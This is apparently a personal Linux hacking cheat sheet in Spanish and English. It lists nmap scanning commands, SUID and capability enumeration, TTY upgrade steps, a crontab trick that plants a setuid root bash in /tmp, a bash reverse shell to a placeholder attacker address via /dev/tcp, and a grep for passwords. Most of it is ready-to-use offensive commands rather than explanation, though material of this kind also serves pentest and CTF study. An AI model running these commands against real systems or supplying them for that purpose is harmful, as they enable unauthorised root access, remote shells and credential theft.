<h1 style="text-align:center;font-size:40px;">LINUX HACKING</h1>


## Dockers

[Kali](https://hub.docker.com/r/leplusorg/kali)
[Kali XFCE](https://hub.docker.com/r/kasmweb/core-kali-rolling)

## Y

### nmap

```sh
nmap 192.168.1.0/24 -sn # escanear red
nmap 192.168.1.X -O # ver informacion del sistema operativo
nmap 192.168.1.X -sV # ver versiones
nmap 192.168.1.X --script vuln # escanear vulnerabilidades
nmap -v -p- --min-rate 5000 -sV -sC X
sudo nmap -n -PN -sS -sC -sV -T5 -p- 192.168.1.X
```

> -v : Increase the verbosity level (basically output more info)
> 
> -p- : This flag scans for all TCP ports ranging from 0-65535
> 
> -sV : Attempts to determine the version of the service running on a port
> 
> -sC : Scan with default NSE scripts
> 
> --min-rate : This is used to specify the minimum number of packets Nmap should send per second; it speeds up the scan as the number goes higher

Escaneo basico:

```sh
nmap -A -T4 scanme.nmap.org
```

### LINUX REMOTO

#### Escalar

- [gtfobins](https://gtfobins.github.io)
- [hacktricks](book.hacktricks.xyz)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)

> Ver los permisos de ejecucion
- `find / -perm -4000 -user root 2>/dev/null | xargs ls -l`
- `find / -group {GROUP} 2>/dev/null`
- `getcap -r / 2>/dev/null`


> enviar netcat de un proceso en cron como root

#### FULL TTY

```sh
python -c 'import pty;pty.spawn("/bin/bash")' # python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl + Z para segundo plano
stty raw -echo;fg;ls; export SHELL=/bin/bash;export TERM=xterm-256color # traer tarea
```

```sh
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

##### Crontab

```sh
#1
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

```sh
/tmp/rootbash -p
```

```sh
#2
"bash -i >& /dev/tcp/{ATACANTE}/4444 0>&1 "
```

#### Passwords

```sh
cat * | grep -i passw*
```
